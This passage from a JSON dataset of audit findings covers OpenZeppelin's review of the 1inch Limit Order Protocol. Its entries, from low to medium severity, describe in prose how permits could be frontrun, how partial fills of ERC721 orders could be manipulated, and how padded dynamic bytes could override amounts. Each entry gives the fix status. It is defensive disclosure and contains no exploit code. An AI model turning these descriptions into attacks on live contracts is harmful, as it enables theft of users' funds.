accidentally lock up their funds, consider validating that the `target` address does not equal the zero address in the cited functions.\n\n\n***Update:** Fixed in [pull request #78](https://github.com/1inch/limit-order-protocol/pull/78).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10690",
      "title": "[L07] Inconsistent decoding methodologies could cause outcome discrepancies",
      "impact": "LOW",
      "content": "To support all of its extensibility and flexibility, the Limit Order Protocol routinely has to deal with dynamic bytes data and arbitrary return values from external contracts. As a result, the protocol includes an [`ArgumentsDecoder`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol) library to more efficiently convert dynamic bytes values into basic data types. However, this library is not used exclusively, and in some cases `abi.decode` is used instead. Additionally, some contracts are using [`abi coder v1`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol) while others are using [`abi coder v2`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol). The former performs more similarly to the `ArgumentsDecoder` library, whereas the latter performs additional checks when decoding.\n\n\nThe inconsistent usage of these different decoding methodologies can result in subtle discrepancies between the intention and actual behavior of the codebase.\n\n\nFor instance, the [`simulateCalls`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L116) function only uses the [`ArgumentsDecoder.decodeBool`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol#L16) function. If the `simulateCalls` function is used to check calls that would be made in the predicate part of an order, then its results could deviate from what actually occurs when the predicate conditions are evaluated, because different decoding methodologies are employed.\n\n\nSo, for instance, if a predicate makes an external `staticcall` to some function that returns a `uint256` value greater than one rather than the expected `bool`, then that call will revert, because the return value is [decoded with `abi coder v2`‘s `abi.decode`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol#L19) which will not accept such values as `bool`. However, if the exact same call is made with `simulateCalls`, then it [will simply be marked as `true`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L123), because `decodeBool` treats any value larger than zero as `true`.\n\n\nTo make the `simulateCalls` function fully mirror the behavior of actual predicate calls, consider modifying it to use `abi.decode`.\n\n\n***Update:** Fixed in [pull request #82](https://github.com/1inch/limit-order-protocol/pull/82).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10689",
      "title": "[L06] Storage changes during event emission",
      "impact": "LOW",
      "content": "In the [`NonceManager`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol) contract, when the [`NonceIncreased`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol#L8) event is emitted, [the nonce of the message sender is also increased](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol#L19).\n\n\nExecuting multiple operations simultaneously can make the codebase harder to reason about, more prone to errors, and can lead to operations being overlooked or misunderstood.\n\n\nTo improve the overall intentionality, readability, and clarity of the code, consider increasing the nonce value before emitting the event.\n\n\n***Update:** Fixed in [pull request #63](https://github.com/1inch/limit-order-protocol/pull/63).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10688",
      "title": "[L05] Errors and omissions in events",
      "impact": "LOW",
      "content": "Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, many events lack indexed parameters and/or are missing important parameters. For example:\n\n\n* The [`OrderRFQMixin.OrderFilledRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L16), [`OrderMixin.OrderFilled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L31), and [`OrderMixin.OrderCanceled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L38) events should index the `orderHash` parameter.\n* The [`OrderRFQMixin.OrderFilledRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L16) and [`OrderMixin.OrderFilled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L31) events should be more complete, including the `maker`, `taker`, `target`, `amountMaking`, and `amountTaking` where possible.\n\n\nThere are also sensitive actions that are lacking events, such as:\n\n\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, the [`cancelOrderRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L44) function does not emit an event when an order is canceled.\n\n\nConsider more completely indexing existing events and adding new parameters where they are lacking. Also, consider emitting all events in such a complete manner that they could be used to rebuild the state of the contract by off-chain services.\n\n\n***Update:** Not fixed. However, the 1inch team did add an `orderRemaining` parameter to the `OrderCanceled` event in [pull request #62](https://github.com/1inch/limit-order-protocol/pull/62).*\n\n\n*The 1inch team states:*\n\n\n\n> We found that only a limited subset of data is required to satisfy frontend needs. In the case of extensive analysis, all the suggested fields are available via tracing. For `OrderRFQMixin` we expect market makers to build their own sophisticated way of tracking what orders have been canceled.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10687",
      "title": "[L04] Erroneous or misleading test suite",
      "impact": "LOW",
      "content": "There are instances in the test suite where the tests deviate from their expected behavior. For instance:\n\n\n* The [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract is inherited by the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L22) contract. However, during the tests the [`AmountCalculator.arbitraryStaticCall`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/test/ChainLinkExample.js#L26) function is used to call the `ChainlinkCalculator` contract as an external, independent contract. Even though the result is the one expected, the test should reflect the behavior with the current design of the system and anticipated use case by calling `ChainlinkCalculator` functions directly without using the arbitrary static call.\n* Though the proxy contracts were out of scope, we noticed that when testing the protocol with ERC721 assets, the [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) contract is not used to swap the assets in its [test suite](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/test/LimitOrderProtocol.js#L310).\n\n\nAs the test suite itself is outside the scope of this audit, please consider thoroughly reviewing the test suite to make sure all tests run successfully according to the specifications of the protocol.\n\n\n***Update:** Fixed in [pull request #57](https://github.com/1inch/limit-order-protocol/pull/57), [pull request #59](https://github.com/1inch/limit-order-protocol/pull/59), and [pull request #61](https://github.com/1inch/limit-order-protocol/pull/61).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10686",
      "title": "[L03] Duplicated code",
      "impact": "LOW",
      "content": "There are instances of duplicated code within the codebase. Duplicating code can lead to issues later in the development lifecycle and leaves the project more prone to the introduction of errors. Such errors can inadvertently be introduced when functionality changes are not replicated across all instances of code that should be identical. Examples of duplicated code include:\n\n\n* In the [`Permitable`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol) contract, the [`_permit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol#L12) and [`_permitMemory`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol#L31) functions are duplicates.\n* The calculations in the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions are duplicated in the [`fillOrderRFQTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L90) function when calculating [making](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L128) and [taking](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L124) amounts, respectively.\n\n\nRather than duplicating code, consider having just one contract or library containing the duplicated code and using it whenever the duplicated functionality is required.\n\n\n***Update:** Partially fixed in [pull request #60](https://github.com/1inch/limit-order-protocol/pull/60).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10685",
      "title": "[L02] Malicious parties could prevent the execution of permitable orders",
      "impact": "LOW",
      "content": "The [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract allows maker users to submit [permitable orders](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L207) so those can be executed in one transaction, rather than having to have a separate transaction for approvals. Also, order takers can [submit their own permit](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L176) during the filling of the order for the same purpose.\n\n\nHowever, because the maker’s permit is contained inside the [order](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L70), both the maker’s and the taker’s permits would be accessible while the order-fill transaction is in the mempool. This would make it possible for any malicious user to take those permits and execute them on the respective asset contracts while frontrunning the fill transaction. Because these permits have a `nonce` to prevent a double spending attack, the order’s fill transaction would fail as a result of trying to use the same permit that was just used during the frontrun.\n\n\nAlthough there is no security risk, and the maker could create a new order and pre-approve the transaction, this attack could certainly impact the usability of permitable orders. Indeed, a motivated attacker could block *all* permitable orders with this attack. Consider validating if the permit was already submitted, or if the allowance is enough, during the order fills. Also consider letting users know about this possible attack during order composition.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> We had approval checks before but decided to simplify permit flow to just revert on unsuccessful approvals. We’ll think about the ways to notify makers about the issue.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10684",
      "title": "[L01] Constants not declared explicitly",
      "impact": "LOW",
      "content": "There are a few occurrences of literal values being used with unexplained meaning in the codebase. For example:\n\n\n* In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`_remaining`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L80) mapping is semantically overloaded (as explained in the issue ***Semantic overloading of mapping***) to track the amount of asset remaining for a partially filled order *as well as* if an order has been completely filled. Specifically, `0` means that no fills associated with an order have been made, `1` means an order can no longer be filled, and anything larger than `1` means that there is a remaining amount associated with the order that can potentially be filled.\n* In the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract, the literal value `1e18` is used in the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L27-L29) function.\n\n\nTo improve the code’s readability and facilitate refactoring, consider defining a constant for every magic number, giving it a clear and self-explanatory name. For complex values, consider adding an inline comment explaining how they were calculated or why they were chosen.\n\n\n***Update:** Fixed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75) and [pull request #76](https://github.com/1inch/limit-order-protocol/pull/76).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10683",
      "title": "[M03] Undocumented decimal assumptions",
      "impact": "MEDIUM",
      "content": "The [`LimitOrderProtocol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/LimitOrderProtocol.sol) contract inherits the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract through the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract. This contract exposes two functions to enable the usage of Chainlink oracles during the [predicates check](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L218) and the lookup of the [maker amount](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315)/[taker amount](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326).\n\n\nHowever, the contract makes undocumented assumptions about the number of decimals that the Chainlink oracles should report in, as well as the number of decimals that the function parameters should contain. In certain scenarios, this could lead to unexpected behaviors, including the mis-pricing of assets and the unintentional loss of funds.\n\n\nMore specifically, throughout the contract the implicit assumption is that the Chainlink oracles will report with 18 decimals of precision. However, not [all Chainlink oracles](https://docs.chain.link/docs/ethereum-addresses/) report with this number of decimals. In fact, if the oracle reports a token pair that is in terms of a currency (USD, for instance), it will only have 8 decimals of precision. Since there are no restrictions on *which* oracles can be used, implicit assumptions should not be made about the number of decimals they will report with.\n\n\nRelatedly, there is an implicit assumption that the `amount` parameter for the `ChainlinkCalculator` functions will use 18 decimals, together with the misleading explicit declaration that the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) function [`Calculates price of token relative to ETH scaled by 1e18`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L14). In reality, even with an oracle that *does* report with 18 decimals, the return value of the `singlePrice` function would be scaled by the number of decimals of the `amount` parameter, which may not necessarily be 18 decimals.\n\n\nSimilarly, the [`doublePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L35) function assumes that two Chainlink oracles will report with the same number of decimals, causing the result of the function to deviate from expectations.\n\n\nConsider explicitly documenting assumptions regarding the number of decimals that parameters and return values should be in terms of. Furthermore, consider either limiting calculations that depend on oracles that break those assumptions, or having the relevant calculations take the actual number of decimals into account.\n\n\n***Update:** Fixed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75).*",
      "summary": "\nThe LimitOrderProtocol contract is a contract used to enable the usage of Chainlink oracles during predicates check and the lookup of maker and taker amounts. This contract makes implicit assumptions about the number of decimals that the Chainlink oracles should report in, as well as the number of decimals that the function parameters should contain. If the assumptions are not met, it can lead to unexpected behaviors such as mis-pricing of assets and unintentional loss of funds.\n\nThe ChainlinkCalculator contract, which is inherited by the LimitOrderProtocol contract through the OrderMixin contract, exposes two functions to enable the usage of Chainlink oracles. The contract assumes that the Chainlink oracles will report with 18 decimals of precision while not all Chainlink oracles report with the same number of decimals. The contract also assumes that the `amount` parameter for the `ChainlinkCalculator` functions will use 18 decimals.\n\nIn order to fix this issue, it is recommended to explicitly document assumptions regarding the number of decimals that parameters and return values should be in terms of. It is also suggested to consider either limiting calculations that depend on oracles that break those assumptions, or having the relevant calculations take the actual number of decimals into account. This issue has been fixed in pull request #75.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10682",
      "title": "[M02] ERC721 orders can be manipulated",
      "impact": "MEDIUM",
      "content": "It is possible to exchange more than just ERC20s via the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) by deploying a contract that shares the same function selector as IERC20’s `transferFrom`, and providing that contract as the [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L279) or the [`takerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L259) in an order.\n\n\nThe out-of-scope proxies, namely, [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol), [`ERC721ProxySafe`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721ProxySafe.sol), and [`ERC1155Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol) contracts follow this pattern to provide support for `ERC721` and `ERC1155` tokens. Since the proxies must be called with the same pattern as an IERC20 `transferFrom` call, the signature must start with `address from`, `address to` and `uint256 amount`. Anything else that the proxies require can be passed in after, and is defined in the order as [`makerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L279) and [`takerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L259).\n\n\nERC1155s can naturally transfer multiple of the same id tokens at once, which means the [`ERC1155Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol) contract makes use of the `amount` field. On the other hand, `ERC721`s do not have an obvious use for the `amount` field. Since they represent non-fungible tokens, a specific tokenId will only have one in existence, rendering the `amount` field useless. Because of this, the implementation for both [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) and [`ERC721ProxySafe`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721ProxySafe.sol) contracts use the required `amount` field as the `tokenId` instead.\n\n\nThis overloading of the `amount` parameter creates the possibility of partially filling `ERC721` orders in order to purchase separately listed tokens at discounted prices. For instance, there could be a case where a single user has multiple `ERC721`s of the same contract permitted to be transferred by the [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) contract and lists them in separate limit orders.  \n\nIf the limit orders also provide the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L316) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L327) fields, it will be possible to partially fill these `ERC721` orders. Since the order’s [`amount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278) field actually corresponds to the [`tokenId`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol#L22), a malicious user can place a partial fill on the `ERC721` with the higher tokenId, resulting in a [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278)/[`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L258) of an `ERC721` that could correspond to a lower `tokenId`. The result is the `ERC721` with the lower `tokenId` would be transferred at the price of `(higher tokenId price) * (lower tokenId's id) / (higher tokenId's id)`.\n\n\nThis exploit has a few requirements:\n\n\n* Multiple `ERC721`s from the same contract to be allowed on either `ERC721` proxy by a single owner.\n* Open order for one of the `ERC721`s that is not the lowest `tokenId` of the ones allowed.\n* Partial fills allowed on the order.\n\n\nTo completely remove the possibility of partial `ERC721` fills, consider separating the `amount` and `tokenId` arguments. Whether the arguments are separated or not, consider also documenting this to alert users of this behavior and to avoid this pattern in the future.\n\n\n***Update:** Fixed in [pull request #59](https://github.com/1inch/limit-order-protocol/pull/59).*",
      "summary": "\nThe OrderMixin contract allows users to exchange more than just ERC20s. Out-of-scope proxies such as the ERC721Proxy, ERC721ProxySafe, and ERC1155Proxy contracts are used to provide support for ERC721 and ERC1155 tokens. These proxies must be called with the same pattern as an IERC20 transferFrom call, and the signature must start with address from, address to, and uint256 amount. Anything else that the proxies require can be passed in after, and is defined in the order as makerAssetData and takerAssetData. \n\nThe ERC1155Proxy contract makes use of the amount field, while the ERC721Proxy and ERC721ProxySafe contracts use the required amount field as the tokenId instead. This creates the possibility of partially filling ERC721 orders in order to purchase separately listed tokens at discounted prices. \n\nTo avoid this exploit, consider separating the amount and tokenId arguments and document this to alert users of this behavior. This issue was fixed in pull request #59.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10681",
      "title": "[M01] Static arguments passed after dynamic arguments",
      "impact": "MEDIUM",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) bytes fields are used as arguments for the [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) and [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) functions. These calls provide a way to calculate one side of the swap based on the other side, and they allow users to partially fill orders.\n\n\nThe [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68)/[`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields are dynamic variables and are packed in front of the [`takerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`makerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) values in the [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) and [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) functions. It is possible for a malicious maker to provide more data than expected in the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and  \n\n[`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields to push the [`takerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`makerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) bytes past where they are assumed to be when being decoded in the next function. This allows the maker to shift the passed in taker or maker amount by a full bytes to the right and even replace them completely if an extra 32 bytes of data is provided.\n\n\nUsers already have to manually review the [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) and [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) fields in the order, but this technique is rather hard to spot. Also worth noting, this attack even applies to the internally trusted [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions. For most attacks, providing a reasonable threshold amount will prevent loss of funds.\n\n\nTo prevent this, consider encoding the static arguments before the dynamic arguments to avoid giving the dynamic arguments a method to control the static arguments.\n\n\n***Update:** Not fixed. The 1inch team stated:*\n\n\n\n> We’ll take extra care with getters validation. We’ll try to implement sanity validation of getters in our sdk that will help with filtering potentially malicious orders.\n> \n>",
      "summary": "\nThis bug report is about the OrderMixin contract, which is used to calculate swap amounts for users to partially fill orders. It is possible for a malicious maker to provide more data than expected in the getTakerAmount and getMakerAmount fields, which can push the takerAmount and makerAmount bytes past where they are assumed to be when being decoded. This can cause a loss of funds if the maker provides an extra 32 bytes of data, and it is difficult to spot. \n\nTo prevent this, the 1inch team is taking extra care with getters validation and implementing sanity validation of getters in their SDK to help filter out potentially malicious orders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10680",
      "title": "[H03] Malicious maker could take advantage of partial fills to steal taker’s assets",
      "impact": "HIGH",
